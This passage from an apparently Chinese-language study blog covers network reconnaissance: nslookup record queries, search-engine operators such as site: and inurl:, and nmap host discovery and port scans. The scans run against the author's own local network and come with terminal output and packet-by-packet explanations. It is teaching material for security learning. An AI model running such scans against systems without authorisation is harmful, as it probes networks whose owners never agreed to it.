<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nslookup -<span class="built_in">type</span>=mx stu.xidian.edu.cn</span><br><span class="line">main parsing stu.xidian.edu.cn</span><br><span class="line">....</span><br><span class="line">Non-authoritative answer:</span><br><span class="line">printsection()</span><br><span class="line">stu.xidian.edu.cn       mail exchanger = 30 mx-edu.icoremail.net.</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603232844820.png"
alt="image-20220603232844820" />
<figcaption aria-hidden="true">image-20220603232844820</figcaption>
</figure>
<h5 id="查询nx记录">查询NX记录</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=nx &lt;域名&gt;</span><br></pre></td></tr></table></figure>
<h5 id="查询所有类型">查询所有类型</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=any &lt;域名&gt;</span><br></pre></td></tr></table></figure>
<h5 id="交互模式">交互模式</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br></pre></td></tr></table></figure>
<h3 id="搜索引擎利用">搜索引擎利用</h3>
<h4 id="基本搜索">基本搜索</h4>
<h5 id="逻辑与and">逻辑与AND</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235155842.png"
alt="image-20220603235155842" />
<figcaption aria-hidden="true">image-20220603235155842</figcaption>
</figure>
<h5 id="逻辑或">逻辑或</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235313124.png"
alt="image-20220603235313124" />
<figcaption aria-hidden="true">image-20220603235313124</figcaption>
</figure>
<h5 id="逻辑非">逻辑非</h5>
<p>如果搜索"调用约定"时</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235450822.png"
alt="image-20220603235450822" />
<figcaption aria-hidden="true">image-20220603235450822</figcaption>
</figure>
<p>不想看到CSDN的结果</p>
<p><code>调用约定 -csdn</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235527399.png"
alt="image-20220603235527399" />
<figcaption aria-hidden="true">image-20220603235527399</figcaption>
</figure>
<h5 id="通配">通配</h5>
<p>使用通配符*</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235720991.png"
alt="image-20220603235720991" />
<figcaption aria-hidden="true">image-20220603235720991</figcaption>
</figure>
<h4 id="进阶用法">进阶用法</h4>
<h5 id="限定站点范围">限定站点范围</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:&lt;站点&gt;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235947419.png"
alt="image-20220603235947419" />
<figcaption aria-hidden="true">image-20220603235947419</figcaption>
</figure>
<h5 id="标题含有关键词">标题含有关键词</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle &quot;&lt;keyword&gt;&quot;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604000132277.png"
alt="image-20220604000132277" />
<figcaption aria-hidden="true">image-20220604000132277</figcaption>
</figure>
<h5 id="标题含有多组关键词">标题含有多组关键词</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allintitle &lt;keyword1&gt; &lt;keyword2&gt;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604000632480.png"
alt="image-20220604000632480" />
<figcaption aria-hidden="true">image-20220604000632480</figcaption>
</figure>
<h5 id="所有链接到某个url地址的网页">所有链接到某个URL地址的网页</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link: &lt;域名&gt;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604000822823.png"
alt="image-20220604000822823" />
<figcaption aria-hidden="true">image-20220604000822823</figcaption>
</figure>
<h5 id="含有关键字的url地址">含有关键字的url地址</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl: &lt;keyword&gt;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604001059596.png"
alt="image-20220604001059596" />
<figcaption aria-hidden="true">image-20220604001059596</figcaption>
</figure>
<h5 id="特定拓展名文件">特定拓展名文件</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filetype: &lt;ex_name&gt;</span><br></pre></td></tr></table></figure>
<h4 id="配合应用">配合应用</h4>
<p>在某网站下搜索含有某关键字标题的页面</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604001749976.png"
alt="image-20220604001749976" />
<figcaption aria-hidden="true">image-20220604001749976</figcaption>
</figure>
<h2 id="主机信息收集">主机信息收集</h2>
<p>1.主机开放的端口和服务</p>
<p>2.主机操作系统</p>
<p>常见端口及对应服务</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604095959880.png"
alt="image-20220604095959880" />
<figcaption aria-hidden="true">image-20220604095959880</figcaption>
</figure>
<h4 id="nmap">nmap</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604100037232.png"
alt="image-20220604100037232" />
<figcaption aria-hidden="true">image-20220604100037232</figcaption>
</figure>
<p>命令行运行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap 192.168.43.44</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:01 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 5.04 seconds</span><br></pre></td></tr></table></figure>
<p>GUI运行</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604100256337.png"
alt="image-20220604100256337" />
<figcaption aria-hidden="true">image-20220604100256337</figcaption>
</figure>
<p>基本用法</p>
<p><code>nmap -T4 -A -v 192.168.43.44</code></p>
<blockquote>
<p>-A:进攻性方式扫描</p>
<p>-T4:T后面的数字越大,扫描速度越快,越容易被防火墙发现.默认为-T4选项</p>
<p>-v:详细输出扫描情况,显示扫描细节</p>
</blockquote>
<h5 id="主机发现">主机发现</h5>
<h5
id="sl列出将要扫描的ip地址但是不进行主机发现"><code>-sL</code>列出将要扫描的IP地址,但是不进行主机发现</h5>
<p>比如已经写好了一个<code>list.txt</code>作为待扫描的ip地址集合,使用<code>-sL -iL list.txt</code>列出该集合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# <span class="built_in">cat</span> list.txt</span><br><span class="line">192.168.43.44</span><br><span class="line">192.168.43.1</span><br><span class="line">192.168.43.2</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -sL -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:08 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.2</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (0 hosts up) scanned <span class="keyword">in</span> 1.30 seconds</span><br></pre></td></tr></table></figure>
<h5
id="sn-sp只进行主机发现不进行端口扫描"><code>-sn/-sP</code>只进行主机发现,不进行端口扫描</h5>
<p><code>192.168.43.1</code>是手机热点的ip地址,</p>
<p><code>192.168.43.44</code>是本机<code>Executor</code>的ip地址</p>
<p><code>192.168.43.2</code>是杜撰的一个ip地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:10 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.019s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.54 seconds</span><br></pre></td></tr></table></figure>
<p>运行结果显示<code>192.168.43.1</code>和<code>192.168.43.44</code>在线,<code>192.168.43.2</code>不在线</p>
<blockquote>
<p>如果不使用<code>-sn</code>选项,nmap首先进行主机发现,然后进行端口扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap  -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:12 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.014s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 7.13 seconds</span><br></pre></td></tr></table></figure>
</blockquote>
<h5
id="pn认为主机都存活直接端口扫描"><code>-Pn</code>认为主机都存活,直接端口扫描</h5>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap  -Pn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:13 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.0063s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.2</span><br><span class="line">Host is up (0.060s latency).		<span class="comment">#这里&quot;host is up&quot;是-Pn选项的作用,让nmap认为它在线,但是没有找到任何打开的端口</span></span><br><span class="line">All 1000 scanned ports on 192.168.43.2 are <span class="keyword">in</span> ignored states.</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response), 4 filtered tcp ports (host-unreach)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (3 hosts up) scanned <span class="keyword">in</span> 14.64 seconds</span><br></pre></td></tr></table></figure>
<h5
id="pspapupy使用各种协议方式进行扫描"><code>-PS/PA/PU/PY</code>使用各种协议方式进行扫描</h5>
<p>如果不指定这四个之一,则默认使用TCP和ICMP两种方式分别进行主机发现</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap  -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:50 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.0054s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.55 seconds</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604105103155.png"
alt="image-20220604105103155" />
<figcaption aria-hidden="true">image-20220604105103155</figcaption>
</figure>
<h6 id="ps使用tcp-syn方式进行主机发现"><code>-PS</code>使用TCP
SYN方式进行主机发现</h6>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -PS -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:16 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.0080s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 1.51 seconds</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604101822988.png"
alt="image-20220604101822988" />
<figcaption aria-hidden="true">image-20220604101822988</figcaption>
</figure>
<blockquote>
<p>运行nmap的wsl kali linux的ip地址是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.28.30.195  netmask 255.255.240.0  broadcast 172.28.31.255</span><br><span class="line">        inet6 fe80::215:5dff:feeb:45a2  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:15:5d:eb:45:a2  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 2564  bytes 187120 (182.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 10190  bytes 598185 (584.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
</blockquote>
<p>No.1由kali发往192.168.43.2,使用TCP协议的SYN包</p>
<p>No.2由kali发往192.168.43.44,使用TCP协议的SYN包</p>
<p>No.3由kali发往192.168.43.1,使用TCP协议的SYN包</p>
<p>No.4由192.168.43.44发往kali,使用TCP协议SYN,ACK包,kali只要收到该包就知道,129.168.43.44是存活的</p>
<p>No.5由kali发往192.168.43.44,使用TCP协议RST包,kali的主机发现目的已经达到,不再根192.168.43.44胡诌八扯,直接断开连接</p>
<blockquote>
<p>RST标志位</p>
<p>RST表示复位，用来<strong>异常的关闭连接</strong>，在TCP的设计中它是不可或缺的。就像上面说的一样，发送RST包关闭连接时，不必等缓冲区的包都发出去（不像上面的FIN包），直接就丢弃缓存区的包发送RST包。而接收端收到RST包后，也不必发送ACK包来确认。</p>
<p>TCP处理程序会在自己认为的异常时刻发送RST包。例如，A向B发起连接，但B之上并未监听相应的端口，这时B操作系统上的TCP处理程序会发RST包。</p>
<p>又比如，AB正常建立连接了，正在通讯时，A向B发送了FIN包要求关连接，B发送ACK后，网断了，A通过若干原因放弃了这个连接（例如进程重启）。网通了后，B又开始发数据包，A收到后表示压力很大，不知道这野连接哪来的，就发了个RST包强制把连接关了，B收到后会出现connect
<a
target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=reset&amp;spm=1001.2101.3001.7020">reset</a>
by peer错误。</p>
</blockquote>
<p>No.6由192.168.43.1发往kali,使用TCP协议RST,ACK包.</p>
<blockquote>
<p>[RST,ACK]是什么含义呢?</p>
<p>在No.3kali发往192.168.43.1的SYN数据包中,目的端口是192.168.43.1:80</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604102924144.png"
alt="image-20220604102924144" />
<figcaption aria-hidden="true">image-20220604102924144</figcaption>
</figure>
<p>但是前面我们已经扫描过了,192.168.43.1并未开放该端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:27 中国标准时间</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line"></span><br><span class="line">Host is up (0.011s latency).</span><br><span class="line"></span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"></span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">MAC Address: 92:74:8B:ED:5E:D6 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.43 seconds</span><br></pre></td></tr></table></figure>
<p>于是No.6的意思就是,192.168.43.1对kali说:"你说的话我听见了(收到No.3),但是我听不懂(未开放No.3的目的端口)"</p>
<p>但是kali nmap不管这么多,kali
nmap就是想知道192.168.43.1是死是活,即使是一个听不懂话的白痴,也是一个活着的,只要有回复,不管回复的啥都视为或者</p>
</blockquote>
<p>kali始终没有收到192.168.43.2,nmap认为它不存在或者已经死了</p>
<h6
id="pa使用tcp协议ack包进行主机发现"><code>-PA</code>使用TCP协议ACK包进行主机发现</h6>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -PA -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:33 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.010s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (1 host up) scanned <span class="keyword">in</span> 1.50 seconds</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604103434323.png"
alt="image-20220604103434323" />
<figcaption aria-hidden="true">image-20220604103434323</figcaption>
</figure>
<p>No.201~No.203,kali向三个ip地址都发送了一个ACK包,</p>
<p>No.204,kali收到了192.168.43.1的回复,回复使用的是TCP协议RST包,意思是192.168.43.1只回了一个收到,但是不想进一步连接</p>
<p>然后No.205,No.206是kali对另外两个IP地址重复发送了ACK包,确保未收到它俩的信息不是路上的问题.</p>
<p>结果kali仍未收到它俩的回复,因此认为它俩不存在或者已死亡</p>
<blockquote>
<p>但是192.168.43.44是或者的,为啥他不应答呢?</p>
<p>一些操作系统对于不规范的TCP连接请求会直接忽略,比如192.168.43.44上的</p>
<p>一些操作系统对于不规范的TCP连接会敷衍一下但是不建立连接,比如192.168.43.1上的</p>
</blockquote>
<h6
id="pu使用udp协议进行主机发现"><code>-PU</code>使用UDP协议进行主机发现</h6>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -PU -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:39 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00039s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.096s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 1.64 seconds</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604104140787.png"
alt="image-20220604104140787" />
<figcaption aria-hidden="true">image-20220604104140787</figcaption>
</figure>
<p>No.275~No.277,kali向三个ip地址发送了UDP数据报</p>
<p>No.278,No.279,两个目标ip使用ICMP数据报回复,但是192.168.43.2没有回复</p>
<p>NO.280kali向192.168.43.2再次询问"小老弟你怎么回事",但是仍然没有收到其答复,于是kali
nmap认为小老弟死球了</p>
<h6
id="py使用sctp协议init包进行主机发现"><code>-PY</code>使用SCTP协议INIT包进行主机发现</h6>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -PY -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:44 CST</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (0 hosts up) scanned <span class="keyword">in</span> 2.17 seconds</span><br></pre></td></tr></table></figure>
<p>真的太逊了,谁也没发现</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604104524209.png"
alt="image-20220604104524209" />
<figcaption aria-hidden="true">image-20220604104524209</figcaption>
</figure>
<p>全都是kali发往其他ip的SCTP数据报,但是没有收到任何回复</p>
<h5 id="端口扫描">端口扫描</h5>
<h5 id="端口状态">端口状态</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604110513885.png"
alt="image-20220604110513885" />
<figcaption aria-hidden="true">image-20220604110513885</figcaption>
</figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -p 80 -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:04 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.0089s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">80/tcp closed http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.69 seconds</span><br></pre></td></tr></table></figure>
<p>本机192.168.43.44上的80端口就是open状态</p>
<p>192.168.43.1上的80端口就是close状态</p>
<h6
id="netstat--n查看本机端口状态"><code>netstat -n</code>查看本机端口状态</h6>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>&gt; netstat <span class="literal">-n</span></span><br><span class="line"></span><br><span class="line">活动连接</span><br><span class="line"></span><br><span class="line">  协议  本地地址          外部地址        状态</span><br><span class="line">  TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28825</span>        <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">54530</span>        ESTABLISHED</span><br><span class="line">  TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28826</span>        <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28827</span>        ESTABLISHED</span><br><span class="line">  TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28827</span>        <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28826</span>        ESTABLISHED</span><br><span class="line">  TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">54530</span>        <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28825</span>        ESTABLISHED</span><br><span class="line">  TCP    <span class="number">192.168</span>.<span class="number">43.44</span>:<span class="number">28944</span>    <span class="number">40.90</span>.<span class="number">189.152</span>:<span class="number">443</span>      ESTABLISHED</span><br><span class="line">  TCP    <span class="number">192.168</span>.<span class="number">43.44</span>:<span class="number">29072</span>    <span class="number">103.212</span>.<span class="number">12.46</span>:<span class="number">3000</span>     ESTABLISHED</span><br><span class="line">  TCP    <span class="number">192.168</span>.<span class="number">43.44</span>:<span class="number">29910</span>    <span class="number">61.150</span>.<span class="number">43.81</span>:<span class="number">443</span>       CLOSE_WAIT</span><br><span class="line">  ....</span><br></pre></td></tr></table></figure>
